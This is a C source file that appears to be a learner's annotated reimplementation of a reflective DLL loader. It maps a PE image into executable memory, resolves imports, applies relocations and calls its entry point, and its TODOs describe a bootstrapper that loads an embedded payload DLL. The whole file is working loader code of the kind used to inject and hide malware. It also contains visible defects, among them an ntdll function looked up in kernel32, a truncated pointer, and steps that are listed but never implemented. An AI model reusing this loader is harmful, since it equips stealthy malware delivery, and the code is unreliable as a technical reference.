/*
1. Locate the PE headers
2. allocate memory for the image
3. map sections into the new memory
4. apply relocations
5. resolve imports
6. fix protections
7. run TLS callbacks
8. call the module's entry point (DllMain)
*/

// TODO: this file should be a "bootstrapper" .dll that loads the rawbytes that exist in its .data section. These rawbytes should be the payload.dll

// TODO: lots of "extra" variables i added just for better readability that might make code slightly less
// optimized. should probs revert back to fewer's code if i want optimize it in that way again

#include "ReflectiveLoader.h"
#include "GetModuleHandleManual.h"
#include "GetProcAddressManual.h"

// Our loader will set this to a pseudo correct HINSTANCE/HMODULE value
HINSTANCE hAppInstance = NULL;


#pragma intrinsic( _ReturnAddress ) // MSVC only
// __builtin_return_address(0); // GCC/MinGW equivalent?

// This function can not be inlined by the compiler or we will not get the address we expect. Ideally 
// this code will be compiled with the /O2 and /Ob1 switches. Bonus points if we could take advantage of 
// RIP relative addressing in this instance but I dont believe we can do so with the compiler intrinsics 
// available (and no inline asm available under x64).
__declspec(noinline) ULONG_PTR caller(VOID) { return (ULONG_PTR)_ReturnAddress(); }


// ReflectiveLoader() function that external stager calls
// DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpReserved)
DLLEXPORT ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
{

	// NOTE: caller() gives the return address of the instruction that called caller()
	// which basically means it gives us the address to the next line of code in this function?
	// Therefore, this address is going to be somewhere within our injected dll buffer (the dll being the reflective dll)
	// TODO: figure out a better name for this
	ULONG_PTR uiLibraryAddress = caller(); 

	//PIMAGE_NT_HEADERS pNTHeader = NULL;
	PIMAGE_NT_HEADERS pNTHeader;
	LONG ntHeaderOffset;


	// loop through memory backwards searching for our image's base address (image meaning our reflective dll)
	// NOTE: it is called an image because an image is just a PE file loaded/living in memory?
	// we dont need SEH style search as we shouldnt generate any access violations with this
	while (TRUE)
	{
		if (((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_magic == IMAGE_DOS_SIGNATURE) // NOTE: checks if uiLibraryAddress points to the start of the DOS Header
		{
			// this is just the offset
			ntHeaderOffset = ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew; // NOTE: here, pNTHeader isn't a PIMAGE_NT_HEADERS but just an offset to it
			// some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),
			// we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.
			if (ntHeaderOffset >= sizeof(IMAGE_DOS_HEADER) && ntHeaderOffset < 1024)
			{
				//pNTHeader += uiLibraryAddress; // NOTE: now pNTHeader actually becomes a PIMAGE_NT_HEADERS
				pNTHeader = uiLibraryAddress + ntHeaderOffset;
				// break if we have found a valid MZ/PE header
				if (pNTHeader->Signature == IMAGE_NT_SIGNATURE)
				{
					break;
				}
			}
		}
		uiLibraryAddress--;
	}

	// NOTE: at this point uiLibraryAddress should be where our target.dll (the dll we injected into the process)
	// starts in memory



	// TODO: my code is a lot cleaner but by using a massive while loop like 
	// here: https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveLoader.c#L125-L262
	// we can resolve everything in one pass through  

	// TODO: i don't think i can use stuff like GetModuleHandleManual/GetProcAddressManual? because i don't have 
	// access yet to the rest of the dll
	HMODULE kernel32_module = GetModuleHandleManual(L"kernel32.dll");
	HMODULE ntdll_module = GetModuleHandleManual(L"ntdll.dll");

	LOADLIBRARYA pLoadLibraryA = GetProcAddressManual(kernel32_module, "LoadLibraryA");

	// TODO: is this one needed or can i just use GetProcAddressManual? i think i can just use manual
	GETPROCADDRESS pGetProcAddress = GetProcAddressManual(kernel32_module, "GetProcAddress");
	VIRTUALALLOC pVirtualAlloc = GetProcAddressManual(kernel32_module, "VirtualAlloc");
	NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = GetProcAddressManual(kernel32_module, "NtFlushInstructionCache");

	////////////////////////////////////////////////


	pNTHeader = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;



	// allocate all the memory for the DLL to be loaded into. we can load at any address because we will  
	// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.
	// NOTE: the base address of the dll we are manually mapping.
	// the kernels base address and later this images newly loaded base address
	ULONG_PTR baseAddress = (ULONG_PTR)pVirtualAlloc(NULL, ((PIMAGE_NT_HEADERS)pNTHeader)->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);


	// copy over dos header, dos stub, and pe header into baseAddress?
	
	// NOTE: SizeOfHeaders is the size of all the headers (from DosHeader to SectionHeaders)
	DWORD uiValueA = ((PIMAGE_NT_HEADERS)pNTHeader)->OptionalHeader.SizeOfHeaders; // TODO: rename uiValueA variable
	ULONG_PTR uiValueB = uiLibraryAddress; // store off address... libraryaddress is the address of where the target dll exist on the disk
	ULONG_PTR uiValueC = baseAddress; // store off address... baseAddress is where we are trying to write our dll into the process we are injecting it into

	// we get the number of sections in the pe file, so we can write each section into memory 
	WORD nSections = pNTHeader->FileHeader.NumberOfSections;


	// uiValueA = the VA of the first section
	// NOTE: OptionalHeader is the last field in PIMAGE_NT_HEADERS, so when we do 
	// OptionalHeader + SizeOfOptionalHeader we get the address to the first section 
	// header (these section headers point us to where its data lives).
	// NOTE: the SectionHeader "block" in the PE file structure is a table of 
	// every section's (of the pe file) header 
	uiValueA = ( (ULONG_PTR)&(pNTHeader)->OptionalHeader + pNTHeader->FileHeader.SizeOfOptionalHeader);
	DWORD uiValueD;
	// NOTE: loop through all the sections in the pe file
	while (nSections--)
	{

		// uiValueC if the VA for this sections data
		// NOTE: gets the address of the section's data we want to copy (this is the src)
		uiValueC = (uiLibraryAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->PointerToRawData); 

		// uiValueB is the VA for this section
		// NOTE: gets the address of where we want to copy the section's data into (this is the destination)
		uiValueB = (baseAddress + ((PIMAGE_SECTION_HEADER)uiValueA)->VirtualAddress);

		// copy the section over
		// NOTE: how many bytes we need to copy over (this is the section's size)
		uiValueD = ((PIMAGE_SECTION_HEADER)uiValueA)->SizeOfRawData; // TODO: declare this variable outside the loop

		// NOTE: copy over the data for the section 1 byte at a time
		while(uiValueD--)
		{
			*(BYTE *)uiValueB++ = *(BYTE *)uiValueC++;
		}

		// get the VA of the next section
		uiValueA += sizeof(IMAGE_SECTION_HEADER);
	}

	//uiValueB = the address of the import directory
	// NOTE: at this point, uiValueB is gonna look like this: https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_data_directory
	uiValueB = (ULONG_PTR)&(pNTHeader)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	// we assume their is an import table to process
	// uiValueC is the first entry in the import table
	// NOTE: uiValueC should now point to PIMAGE_IMPORT_DESCRIPTOR
	uiValueC = ( baseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress); // TODO: use different variable here

	// itterate through all imports
	// NOTE: Name is an RVA to the name as a string
	// NOTE: we can do this because the import table is NULL-terminated by an array of IMAGE_IMPORT_DESCRIPTOR
	// NOTE: we're looping through all the imports because we're resolving all the imports/dlls that our 
	// reflective dll depends on. (we're resolving by calling getprocaddress)
	while (((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name)
	{
		// use LoadLibraryA to load the imported module into memory
		// NOTE: at this point, uiLibraryAddress is no longer for the address where our reflective dll exists in memory
		// in the process we injected into. now, uiLibraryAddress will represent the the address of the dll's whos 
		// functions we are trying to resolve 
		uiLibraryAddress = (ULONG_PTR)pLoadLibraryA((LPCSTR)(baseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->Name));

		// uiValueD = VA of the OriginalFirstThunk
		// TODO: should be a ULONG_PTR? using a DWORD would break this when the dll is greater than 4gb (this should never happen tho)
		DWORD uiValueD = (baseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->OriginalFirstThunk);

		// uiValueA = VA of the IAT (via first thunk not origionalfirstthunk)
		uiValueA = (baseAddress + ((PIMAGE_IMPORT_DESCRIPTOR)uiValueC)->FirstThunk);

		// itterate through all imported functions, importing by ordinal if no name present
		while (DEREF(uiValueA))
		{
			// sanity check uiValueD as some compilers only import by FirstThunk
			// NOTE: i can remove this if block if ik for certain my compiler isn't only importing by first thunk
			if (uiValueD && ((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				// get the VA of the modules NT Header
				// TODO: type should be PIMAGE_NT_HEADERS, right? and variable name should be changed
				//uiExportDir = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;
				PIMAGE_NT_HEADERS importedNtHeader = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)->e_lfanew;

				// uiNameArray = the address of the modules export directory entry
				//uiNameArray = (ULONG_PTR) & ((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
				DWORD dwExportDirRVA = importedNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; // TODO: cast to ULONG_PTR instead? 

				// get the VA of the export directory
				//uiExportDir = (uiLibraryAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);
				PIMAGE_EXPORT_DIRECTORY pExportDir = uiLibraryAddress + dwExportDirRVA; // TODO: cast to correct types

				// get the VA for the array of addresses
				//uiAddressArray = (uiLibraryAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);
				// DWORD* uiAddressArray = uiLibraryAddress + pExportDir->AddressOfFunctions; // TODO: cast to a ulong_ptr instead? NOTE: from my apimanager code
				ULONG_PTR uiAddressArray = uiLibraryAddress + pExportDir->AddressOfFunctions; // TODO: cast to a ulong_ptr instead? 

				// use the import ordinal (- export ordinal base) as an index into the array of addresses
				//uiAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal) - ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->Base) * sizeof(DWORD));
				uiAddressArray += ((IMAGE_ORDINAL(((PIMAGE_THUNK_DATA)uiValueD)->u1.Ordinal) - pExportDir->Base) * sizeof(DWORD));

				// patch in the address for this imported function
				DEREF(uiValueA) = (uiLibraryAddress + DEREF_32(uiAddressArray));
			}
			else
			{
				// get the VA of this functions import by name struct
				uiValueB = (baseAddress + DEREF(uiValueA));

				// use GetProcAddress and patch in the address for this imported function
				DEREF(uiValueA) = (ULONG_PTR)pGetProcAddress((HMODULE)uiLibraryAddress, (LPCSTR)((PIMAGE_IMPORT_BY_NAME)uiValueB)->Name);
			}
			// get the next imported function
			uiValueA += sizeof(ULONG_PTR);
			if (uiValueD)
				uiValueD += sizeof(ULONG_PTR);
		}

		// get the next import
		uiValueC += sizeof(IMAGE_IMPORT_DESCRIPTOR);
	}
	///////////////////////////////////////////////////////////
	// NOTE: we don't need to check if the preferred image base is available because since
	// we are using VirtualAlloc to allocate a new memory block, we perform relocations everytime.
	// Using VirtualAlloc means that we will always have memory avaiable to us; however, we wont know 
	// where VirtualAlloc will place the DLL. And most of the time the memory region chosen by Windows
	// (when we call VirtualAlloc) will not match the preferred base in the PE header.

	// calculate the base address delta and perform relocations (even if we load at desired image base)
	// TODO: should rename uiLibraryAddress or use a different variable name. the variable should be called 
	// maybe something like "relocationOffset" or something
	//uiLibraryAddress = baseAddress - ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.ImageBase;
	uiLibraryAddress = baseAddress - pNTHeader->OptionalHeader.ImageBase;

	// uiValueB = the address of the relocation directory
	// NOTE: get IMAGE_DATA_DIRECTORY for relocation table. uiValueB is type _IMAGE_DATA_DIRECTORY
	// which has a field called VirtualAddress which gives a relative address to the relocation table
	// relative to the image base
	uiValueB = (ULONG_PTR) & pNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	// NOTE: relocations are stored in relocation "blocks" IMAGE_BASE_RELOCATION. each
	// relocation block contains a number of different relocations (which can be obtained from SizeOfBlock). 
	// IMAGE_BASE_RELOCATION blocks are a thing so windows doesn't have to store every single relocation
	// needed one after another in a continguous block of memory

	// check if their are any relocation blocks (IMAGE_BASE_RELOCATION) present
	if (((PIMAGE_DATA_DIRECTORY)uiValueB)->Size)
	{
		// uiValueC is now the first entry (IMAGE_BASE_RELOCATION)
		uiValueC = (baseAddress + ((PIMAGE_DATA_DIRECTORY)uiValueB)->VirtualAddress);

		// and we itterate through all entries...
		// NOTE: we can do this because windows api says the IMAGE_BASE_RELOCATION blocks are terminated
		// by a NULL relocation block, meaning SizeOfBlock will be 0 when we want to stop looking/relocating
		while (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock)
		{
			// uiValueA = the VA for this relocation block
			uiValueA = (baseAddress + ((PIMAGE_BASE_RELOCATION)uiValueC)->VirtualAddress);

			// uiValueB = number of entries in this relocation block
			uiValueB = (((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);

			// uiValueD is now the first entry in the current relocation block
			uiValueD = uiValueC + sizeof(IMAGE_BASE_RELOCATION);

			// we itterate through all the entries in the current block...
			while (uiValueB--)
			{
				// perform the relocation, skipping IMAGE_REL_BASED_ABSOLUTE as required.
				// we dont use a switch statement to avoid the compiler building a jump table
				// which would not be very position independent!
				if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_DIR64) // relocations for 64bit only
				{
					*(ULONG_PTR*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += uiLibraryAddress;
				}
				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGHLOW) // relocations for 32bit only (if the dll is compiled in 32bit)
				{
					*(DWORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += (DWORD)uiLibraryAddress;
				}
				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_HIGH) // TODO: remove this? this is only needed in very old legacy 32bit relocations
				{
					*(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += HIWORD(uiLibraryAddress);
				}
				else if (((PIMAGE_RELOC)uiValueD)->type == IMAGE_REL_BASED_LOW) // TODO: remove this? this is only needed in very old legacy 32bit relocations
				{
					*(WORD*)(uiValueA + ((PIMAGE_RELOC)uiValueD)->offset) += LOWORD(uiLibraryAddress);
				}

				// get the next entry in the current relocation block
				uiValueD += sizeof(IMAGE_RELOC);
			}

			// get the next entry in the relocation directory
			uiValueC = uiValueC + ((PIMAGE_BASE_RELOCATION)uiValueC)->SizeOfBlock;
		}
	}
	////////////////////////////////////
	// 
	// 
	// STEP 6: call our images entry point

	// uiValueA = the VA of our newly loaded DLL/EXE's entry point
	uiValueA = (baseAddress + pNTHeader->OptionalHeader.AddressOfEntryPoint);

	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
	pNtFlushInstructionCache((HANDLE)-1, NULL, 0);

	// call our respective entry point, fudging our hInstance value
	// if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)
	((DLLMAIN)uiValueA)((HINSTANCE)baseAddress, DLL_PROCESS_ATTACH, lpParameter);

	// STEP 8: return our new entry point address so whatever called us can call DllMain() if needed.
	return uiValueA; 

}

// TODO: HMODULE and HINSTANCE are the same... so choose one to use and change the rest for consitency
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
		{
			*(HMODULE*)lpReserved = hAppInstance;
		}
	case DLL_PROCESS_ATTACH:
		// Initialize once for each new process.
		// Return FALSE to fail DLL load.
		break;
	case DLL_THREAD_ATTACH:
		// Do thread-specific initialization.
		break;
	case DLL_THREAD_DETACH:
		// Do thread-specific cleanup.
		// hAppInstance = hModule;
		break;
	case DLL_PROCESS_DETACH:
		if (lpReserved != NULL)
		{
			break; // do not do cleanup if process termination scenario
		}
		// Perform any necessary cleanup.
		break;
	}
    return TRUE;
}


/*

TODO: load data that exists 
LoadEngineThread();
    - locates the engine dll bytes inside host.dll's memory storeage

MapModuleFromMemory();

EngineEntry() optional export inide engine dllpoint 


*/
